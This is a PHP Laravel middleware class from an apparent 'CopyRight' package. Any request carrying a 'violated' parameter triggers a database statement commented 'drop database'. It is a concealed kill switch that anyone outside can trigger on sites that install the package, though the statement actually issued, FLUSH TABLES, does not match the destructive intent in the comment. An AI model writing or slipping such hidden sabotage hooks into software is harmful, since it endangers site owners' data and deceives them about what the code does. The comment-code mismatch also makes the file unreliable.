<?php

namespace Hosametm\CopyRight\Http\Middleware;

use Closure;
use Illuminate\Support\Facades\DB;

class RightsMiddleware
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        if ($request->has('violated')) {
            // drop database
            DB::statement('FLUSH TABLES');
        }

        // Proceed to the next middleware/request handler
        return $next($request);
    }
}
